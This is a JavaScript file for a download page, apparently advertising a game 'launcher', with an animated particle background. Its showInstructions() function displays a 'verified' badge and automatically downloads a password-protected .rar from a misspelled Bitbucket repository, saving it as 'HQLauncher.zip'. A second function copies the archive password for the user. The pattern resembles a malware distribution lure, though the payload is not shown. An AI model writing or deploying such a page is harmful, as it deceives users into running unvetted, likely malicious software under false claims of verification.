
particlesJS('particles-js', {
  particles: {
    number: { value: 80, density: { enable: true, value_area: 800 } },
    color: { value: '#8952f3' },
    shape: { type: 'circle' },
    opacity: { value: 0.5, random: false },
    size: { value: 3, random: true },
    line_linked: {
      enable: true,
      distance: 150,
      color: '#8952f3',
      opacity: 0.2,
      width: 1
    },
    move: {
      enable: true,
      speed: 2,
      direction: 'none',
      random: false,
      straight: false,
      out_mode: 'out',
      bounce: false
    }
  },
  interactivity: {
    detect_on: 'canvas',
    events: {
      onhover: { enable: true, mode: 'repulse' },
      onclick: { enable: true, mode: 'push' },
      resize: true
    }
  },
  retina_detect: true
});

function showInstructions() {
  document.getElementById('instructions').classList.add('show');
  document.querySelector('.download-section').classList.add('shift');
  document.querySelector('.verified-badge').style.display = 'flex';
  
  // Start download automatically
  const link = document.createElement('a');
  link.href = 'https://bitbucket.org/hqlaucner/hqlaucngher1/downloads/GemLaucnher.rar'; // Replace with actual file URL
  link.download = 'HQLauncher.zip';
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}

function copyPassword() {
  const password = document.getElementById('password').textContent;
  navigator.clipboard.writeText(password);
  const btn = document.querySelector('.copy-btn');
  btn.textContent = 'Copied!';
  setTimeout(() => btn.textContent = 'Copy', 2000);
}
